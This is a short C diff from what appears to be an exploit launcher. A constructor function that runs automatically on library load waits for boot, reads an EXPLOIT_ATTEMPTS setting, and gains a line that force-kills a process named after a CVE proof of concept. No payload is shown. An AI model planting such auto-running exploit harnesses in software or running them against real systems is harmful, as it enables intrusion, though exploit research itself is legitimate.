@@ -125,6 +125,7 @@ __attribute__((constructor)) static void load(void) {
   started = 1;
   set_unbuffer();
   wait_for_boot_quiet_window();
+  system("pkill -9 cve43499-p0ref 2>/dev/null");
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
